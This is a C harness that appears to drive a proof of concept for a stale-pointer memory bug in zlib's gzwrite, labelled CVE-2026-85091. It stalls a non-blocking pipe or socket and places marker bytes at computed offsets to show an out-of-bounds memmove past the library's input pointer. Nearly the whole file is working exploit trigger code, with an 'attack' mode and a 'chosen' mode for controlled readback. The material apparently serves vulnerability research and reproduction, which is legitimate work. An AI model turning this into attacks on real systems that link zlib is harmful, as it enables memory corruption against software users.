/* zlib2shell harness driver — CVE-2026-85091 stale gzwrite pointer.
 * Adapted from the published pipe PoC (gist thesmartshadow/e0b948179...).
 * Caller buffer bytes and their offsets are chosen here; zlib source is never
 * edited by this harness. MODE=attack uses a full 1 MiB stalled write,
 * MODE=safe uses a 1-byte write with no stall, MODE=chosen uses a short
 * stalled write with marker bytes for deterministic readback.
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include "zlib.h"
static void drain(int fd) {
    char buf[65536];
    while (read(fd, buf, sizeof buf) > 0)
        ;
}

int main(int argc, char **argv) {
    const char *mode = argc > 1 ? argv[1] : "attack";
    size_t write_size = 1024 * 1024;
    int chosen = 0;
    if (!strcmp(mode, "safe")) {
        write_size = 1;
    } else if (!strcmp(mode, "chosen")) {
        write_size = 100000;
        chosen = 1;
    }

    int p[2];
    if (!strcmp(mode, "socket")) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, p)) return 2;
        int bufsz = 4096;
        setsockopt(p[0], SOL_SOCKET, SO_RCVBUF, &bufsz, sizeof bufsz);
        setsockopt(p[1], SOL_SOCKET, SO_SNDBUF, &bufsz, sizeof bufsz);
        fcntl(p[0], F_SETFL, O_NONBLOCK);
        fcntl(p[1], F_SETFL, O_NONBLOCK);
    } else {
        if (pipe2(p, O_CLOEXEC)) return 2;
        fcntl(p[1], F_SETFL, O_NONBLOCK);
        fcntl(p[0], F_SETFL, O_NONBLOCK);
#ifdef F_SETPIPE_SZ
        fcntl(p[1], F_SETPIPE_SZ, 4096);
#endif
    }

    gzFile gz = gzdopen(p[1], "wb");
    if (!gz) return 2;
    unsigned char probe = 0x42;
    gzwrite(gz, &probe, 1);
    gzflush(gz, Z_SYNC_FLUSH);
    drain(p[0]);
    unsigned char *big = malloc(write_size);
    if (!big) return 2;
    /* Incompressible bytes: a stalled peer must leave avail_in > 0, otherwise
     * deflate buffers all input and no stale pointer survives. */
    uint32_t rng = 0x9e3779b9u;
    for (size_t i = 0; i < write_size; i++) {
        rng ^= rng << 13; rng ^= rng >> 17; rng ^= rng << 5;
        big[i] = (unsigned char)rng;
    }
    if (chosen) {
        /* The stalled call consumes K=65535 bytes before EAGAIN. Markers at
         * K+0/K+17/K+16384 land at destination 0/17/16384 after memmove;
         * 16384 is one byte past state->in. */
        big[65535] = 0x5a;
        big[65535 + 17] = 0x44;
        big[65535 + 16384] = 0xc7;
    }

    int stall = 0;
    if (!strcmp(mode, "safe") == 0) {
        char fill[4096];
        memset(fill, 0x55, sizeof fill);
        while (write(p[1], fill, sizeof fill) == (ssize_t)sizeof fill)
            ;
        stall = 1;
    }

    int written = gzwrite(gz, big, (unsigned)write_size);
    printf("MODE=%s\nWRITE_SIZE=%zu\nSTALL=%d\nWRITTEN=%d\n", mode, write_size, stall, written);
    fflush(stdout);
    if (chosen) {
        printf("SRC0=%02x\nSRC17=%02x\nSRC16384=%02x\n", big[65535], big[65535 + 17], big[65535 + 16384]);
        fflush(stdout);
    }
    drain(p[0]);
    gzclearerr(gz);
    int pr = gzprintf(gz, "x");
    printf("PRINTF_RC=%d\n", pr);
    fflush(stdout);
    gzclose(gz);
    close(p[0]);
    free(big);
    printf("RC=0\nTRACE_END=1\n");
    return 0;
}
